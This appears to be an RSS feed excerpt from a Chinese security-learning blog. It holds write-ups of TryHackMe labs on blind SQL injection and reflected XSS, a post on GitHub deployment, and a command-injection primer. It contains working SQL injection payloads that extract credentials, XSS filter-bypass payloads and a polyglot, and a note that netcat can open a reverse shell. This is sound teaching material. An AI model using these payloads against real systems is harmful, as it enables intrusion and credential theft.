&lt;p&gt;与前面的级别一样，我们的第一个任务是建立 users&amp;rsquo; 表中的列数，这可以通过使用 UNION 语句来实现。将 username 值更改为以下内容：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1;-- &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;由于 Web 应用程序已使用取为 false 的值 进行响应，因此我们可以确认这是不正确的列值。 继续添加更多列，直到我们得到 &lt;strong&gt;true&lt;/strong&gt; &lt;strong&gt;的 taken&lt;/strong&gt; 值 。您可以通过将 username 设置为以下值来确认答案为三列：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3;-- &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在我们已经确定了列数，我们可以进行数据库的枚举。我们的第一个任务是发现数据库名称。我们可以通过使用内置的 &lt;strong&gt;database（）&lt;/strong&gt; 方法，然后使用 &lt;strong&gt;like&lt;/strong&gt; 运算符来尝试查找将返回 true 状态的结果。&lt;/p&gt;
&lt;p&gt;尝试以下 username 值，看看会发生什么：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 where database() like &#39;%&#39;;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们得到一个 true 响应，因为在 like 运算符中，我们只有 % 的值 ，它将匹配任何内容，因为它是通配符值。如果我们将通配符运算符更改为 **a%，**您将看到响应返回 false，这确认数据库名称不以字母 &lt;strong&gt;a&lt;/strong&gt; 开头。我们可以循环遍历所有字母、数字和字符，例如 - 和 _，直到找到匹配项。如果您将以下内容作为 username 值发送，您将收到一个 &lt;strong&gt;true&lt;/strong&gt; 响应，确认数据库名称以字母 &lt;strong&gt;s&lt;/strong&gt; 开头&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 where database() like &#39;s%&#39;;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318165301765.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;现在，您继续 数据库名称的下一个字符，直到找到另一个真实的响应，例如，&amp;lsquo;sa%&amp;rsquo;、&amp;lsquo;sb%&amp;rsquo;、&amp;lsquo;sc%&amp;rsquo; 等。继续此过程，直到发现数据库名称的所有字符，即 &lt;strong&gt;sqli_three&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318165348478.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;我们已经建立了数据库名称，现在我们可以通过使用 information_schema 数据库使用类似的方法使用它来枚举表名。尝试将 username 设置为以下值：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = &#39;sqli_three&#39; and table_name like &#39;a%&#39;;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此查询在 &lt;strong&gt;tables&lt;/strong&gt; 表中的 information_schema 数据库中 查找数据库名称与 sqli_three 匹配 且表名称以字母 a 开头的结果。 由于上述查询导致 &lt;strong&gt;false&lt;/strong&gt; 响应，我们可以确认 sqli_three 数据库中没有以字母 a 开头的表。和以前一样，您需要在字母、数字和字符之间循环，直到找到正匹配项。&lt;/p&gt;
&lt;p&gt;您最终会在 sqli_three 数据库中发现一个名为 users 的表，您可以通过运行以下 username payload 来确认该表：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = &#39;sqli_three&#39; and table_name=&#39;users&#39;;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最后，我们现在需要枚举 users 表中的列名 ，以便我们可以正确地搜索登录凭据。 同样，我们可以使用 information_schema 数据库和我们已经获得的信息来查询它的列名。使用下面的有效负载，我们搜索 columns 表，其中 database 等于 sqli_three，表名称为 users，列名称以字母 a 开头。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&#39;sqli_three&#39; and TABLE_NAME=&#39;users&#39; and COLUMN_NAME like &#39;a%&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;同样， 您需要在字母、数字和字符之间循环，直到找到匹配项。由于您要查找多个结果，因此每次找到新的列名称时，都必须将其添加到有效负载中，以避免发现相同的结果。例如，找到名为 id 的列后，将其附加到原始有效负载中（如下所示）。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&#39;sqli_three&#39; and TABLE_NAME=&#39;users&#39; and COLUMN_NAME like &#39;a%&#39; and COLUMN_NAME !=&#39;id&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;重复此过程 3 次，您将发现列的 ID、用户名和密码。现在，您可以使用它来查询 &lt;strong&gt;users&lt;/strong&gt; 表以获取登录凭据。首先，您需要找到一个有效的用户名，您可以使用下面的有效负载：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 from users where username like &#39;a%&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 from users where username=&#39;admin&#39; and password like &#39;a%&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;基于时间的盲注&#34;&gt;基于时间的盲注
&lt;/h3&gt;&lt;p&gt;基于时间的盲目 SQL 注入与上述基于 布尔值的盲注非常相似，因为发送的请求相同，但这次没有明显的查询是错还是对的指示。相反，正确查询的指标基于查询完成所需的时间。此时间延迟是使用内置方法（如 &lt;strong&gt;SLEEP（x）&lt;/strong&gt; 和 UNION 语句引入的。SLEEP（） 方法只会在成功的 UNION SELECT 语句后执行。&lt;/p&gt;
&lt;h4 id=&#34;实际-2&#34;&gt;实际：
&lt;/h4&gt;&lt;p&gt;因此，例如，在尝试建立表中的列数时，您将使用以下查询：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT SLEEP(5);--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果响应时间没有暂停，则我们知道查询不成功，因此与之前的任务一样，我们添加另一列：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT SLEEP(5),2;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有效负载应产生 5 秒的延迟，确认 UNION 语句成功执行，并且有两列。&lt;/p&gt;
&lt;p&gt;按照布尔盲注的步骤，只是更改一下前面的语句，要改成sleep()形式&lt;/p&gt;
&lt;p&gt;最后得到admin：4961&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318171316143.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>关于XSS基础的利用</title>
        <link>https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/</link>
        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/b700481cd7430f01667bb498798f40d218f0b35bb085b3ffa989e042ad5542a1.png" alt="Featured image of post 关于XSS基础的利用" /&gt;&lt;h1 id=&#34;xss-thm-做题记录&#34;&gt;XSS THM 做题记录
&lt;/h1&gt;&lt;h2 id=&#34;level-one&#34;&gt;Level One:
&lt;/h2&gt;&lt;p&gt;看到一个表单，要您输入的姓名，输入姓名后，该表单将在下面的一行中显示，例如：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318144957610.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;如果查看 Page Source，将看到姓名反映在代码中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/f371398ba148e07e85b946028e7f6919.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;我们将尝试输入以下 JavaScript Payload，而不是输入姓名： &lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;THM&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;现在，当单击输入按钮时，将收到一个带有字符串 &lt;strong&gt;THM&lt;/strong&gt; 的警报弹出窗口，页面源代码将如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145139853.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-two&#34;&gt;Level Two：
&lt;/h2&gt;&lt;p&gt;与上一个级别一样，系统将再次要求您输入的姓名。这一次，当单击 enter 时，姓名将反映在 input 标签中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145218406.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;查看页面源，可以看到姓名反映在 input 标签的 value 属性中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145236972.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;如果要尝试前面的 JavaScript 有效负载，它将不起作用，因为无法从 input 标签内部运行它。相反，我们需要先转义 input 标签，以便 payload 可以正常运行。可以使用以下有效负载执行此作：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#39;THM&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;有效负载的重要部分是&lt;code&gt;“&amp;gt;&lt;/code&gt;”，它关闭 value 参数，然后关闭 input 标记。&lt;/p&gt;
&lt;p&gt;现在，这会正确关闭 input 标记并允许 JavaScript 有效负载运行：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145309755.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-three&#34;&gt;Level Three:
&lt;/h2&gt;&lt;p&gt;看到另一个表单，询问名字，与上一级一样，名字会反映在 HTML 标签中，这次是 textarea 标签。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145339066.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;我们必须使用以下有效负载，以略微不同的方式转义 textarea 标签和输入 1（在 Level Two 中）：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;alert(&#39;THM&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145402800.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145411794.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;上述有效负载的重要部分是 &lt;code&gt;&amp;lt;/textarea&amp;gt;&lt;/code&gt;，它会导致 textarea 元素关闭，以便脚本运行。&lt;/p&gt;
&lt;h2 id=&#34;level-four&#34;&gt;Level Four:
&lt;/h2&gt;&lt;p&gt;在表单中输入姓名，会在页面上看到它。此级别看起来类似于 1 级，但在检查页面源代码时，会看到名字反映在一些 JavaScript 代码中。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145451931.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;必须转义现有的 JavaScript 命令，以便能够运行代码;可以使用以下有效负载 &lt;code&gt;&#39;;alert（&#39;THM&#39;）;//&lt;/code&gt; 从下面的屏幕截图中可以看到，它将执行代码。&lt;code&gt;&#39;&lt;/code&gt; 关闭指定名称的字段，然后 &lt;code&gt;;&lt;/code&gt;表示当前命令的结束，末尾的 则``使它后面的任何内容成为注释，而不是可执行代码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145515388.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;level-five&#34;&gt;Level Five:
&lt;/h2&gt;&lt;p&gt;现在，此级别看起来与级别 1 相同，并且名字也会反映在同一个位置。但是，如果尝试有效负载 &lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;THM&#39;);&amp;lt;/script&amp;gt;&lt;/code&gt; ，它将不起作用。当查看页面源代码时，将了解原因。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145543128.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;script&lt;/code&gt; 会从有效负载中删除，这是因为有一个过滤器可以去除任何具有潜在危险的单词。&lt;/p&gt;
&lt;p&gt;当一个单词从字符串中删除时，你可以尝试一个有用的技巧。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145609648.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;尝试输入有效负载 &lt;code&gt;&amp;lt;sscriptcript&amp;gt;alert(&#39;THM&#39;);&amp;lt;/sscriptcript&amp;gt;&lt;/code&gt; 并单击输入按钮，将看到一个带有字符串 THM 的警报弹出窗口。&lt;/p&gt;
&lt;h2 id=&#34;level-six&#34;&gt;Level Six:
&lt;/h2&gt;&lt;p&gt;与第二级类似，我们必须从 input 标签的 value 属性中转义，我们可以尝试 &lt;code&gt;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#39;THM&#39;);&amp;lt;/script&amp;gt; &lt;/code&gt;，但这似乎不起作用。让我们检查一下页面源代码，看看为什么这不起作用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145640111.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;可以看到 &amp;lt; 和 &amp;gt; 字符从我们的 payload 中被过滤掉，从而阻止我们转义 IMG 标签。为了绕过过滤器，我们可以利用 IMG 标签的其他属性，比如 onload 事件。onload 事件将在 src 属性中指定的图像加载到网页后执行您选择的代码。&lt;/p&gt;
&lt;p&gt;让我们更改 payload 以反映这一点 &lt;code&gt;/images/cat.jpg&amp;quot; onload=&amp;quot;alert(&#39;THM&#39;);&lt;/code&gt; ，然后查看页面源，您将看到这将如何工作。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318145659486.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;polyglots&#34;&gt;Polyglots:
&lt;/h2&gt;&lt;p&gt;XSS 多语言是一串文本，可以一站式转义属性、标签和绕过过滤器。可以在刚刚完成的所有 6 个级别上使用以下多语言，并且它会成功执行代码。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;jaVasCript&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:/*-/*&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/*\`/*&amp;#39;/*&amp;#34;/**/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/* */&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;onerror&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;THM&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//%0D%0A%0d%0a//&amp;lt;/stYle/&amp;lt;/titLe/&amp;lt;/teXtarEa/&amp;lt;/scRipt/--!&amp;gt;\x3csVg/&amp;lt;sVg/oNloAd=alert(&amp;#39;THM&amp;#39;)//&amp;gt;\x3e
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>利用github实现自动部署</title>
        <link>https://Yerucrem.github.io/p/%E5%88%A9%E7%94%A8github%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/</link>
        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E5%88%A9%E7%94%A8github%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/d67014b38a1cd68b40e838a207152f5a77ecfc8a2e40c3d56b538fa48de38080.png" alt="Featured image of post 利用github实现自动部署" /&gt;&lt;h1 id=&#34;自动部署&#34;&gt;自动部署
&lt;/h1&gt;&lt;h2 id=&#34;参考&#34;&gt;参考
&lt;/h2&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://letere-gzj.github.io/hugo-stack/p/hugo/custom-blog/#32-github-action%e8%87%aa%e5%8a%a8%e9%83%a8%e7%bd%b2&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;【Hugo】Hugo + Github 免费部署自己的博客&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;均在dev文件夹下&lt;/p&gt;
&lt;h2 id=&#34;首次部署&#34;&gt;首次部署
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git init
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git add .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git commit -m &lt;span class=&#34;s2&#34;&gt;&amp;#34;first commit&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git branch -M main
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git remote add origin {你的github仓库地址}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git push -u origin main
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;试运行&#34;&gt;试运行
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hugo server -D
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ctrl + c [停止运行]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;更新&#34;&gt;更新
&lt;/h2&gt;&lt;p&gt;在dev目录下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git init
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git add .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git commit -m &amp;#34;update&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git branch -M main
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git push 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>命令注入基础</title>
        <link>https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/f11677927824a3d078e08a2c300d8ccf225d496d442a2b7c8be0ca2d5adf6d9a.png" alt="Featured image of post 命令注入基础" /&gt;&lt;h1 id=&#34;命令注入&#34;&gt;命令注入
&lt;/h1&gt;&lt;h2 id=&#34;分类&#34;&gt;分类
&lt;/h2&gt;&lt;p&gt;命令注入主要可以通过以下两种方式之一进行检测：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;盲命令注入&lt;/li&gt;
&lt;li&gt;详细命令注入&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;方法&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;盲&lt;/td&gt;
          &lt;td&gt;这种类型的注入是在测试有效负载时应用程序没有直接输出的地方。您必须调查应用程序的行为，以确定您的有效负载是否成功。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;详细&lt;/td&gt;
          &lt;td&gt;这种类型的注入是测试有效负载后从应用程序获得直接反馈的地方。例如，运行 &lt;code&gt;whoami&lt;/code&gt; 命令以查看应用程序在哪个用户下运行。Web 应用程序将直接在页面上输出用户名。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;有用的有效载荷&#34;&gt;有用的有效载荷
&lt;/h2&gt;&lt;h3 id=&#34;linux&#34;&gt;Linux
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;有效载荷&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;whoami&lt;/td&gt;
          &lt;td&gt;查看应用程序在哪个用户下运行。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ls&lt;/td&gt;
          &lt;td&gt;列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）等文件，以及更多有价值的内容。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ping&lt;/td&gt;
          &lt;td&gt;此命令将调用应用程序以挂起。这在测试应用程序是否进行盲命令注入时非常有用。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;sleep&lt;/td&gt;
          &lt;td&gt;这是测试应用程序盲目命令注入时的另一个有用有效负载，其中计算机未安装 &lt;code&gt;ping&lt;/code&gt;。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;nc&lt;/td&gt;
          &lt;td&gt;Netcat 可用于在易受攻击的应用程序上生成反向 shell。您可以使用此立足点在目标计算机上导航，以获取其他服务、文件或提升权限的潜在方法。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;windows&#34;&gt;windows
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;有效载荷&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;whoami&lt;/td&gt;
          &lt;td&gt;查看应用程序在哪个用户下运行。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;dir&lt;/td&gt;
          &lt;td&gt;列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）等文件，以及更多有价值的内容。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ping&lt;/td&gt;
          &lt;td&gt;此命令将调用应用程序以挂起。这在测试应用程序是否进行盲命令注入时非常有用。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;timeout&lt;/td&gt;
          &lt;td&gt;此命令还将调用应用程序以挂起。如果未安装 &lt;code&gt;ping&lt;/code&gt; 命令，则它还可用于测试应用程序是否进行盲命令注入。&lt;/td&gt;
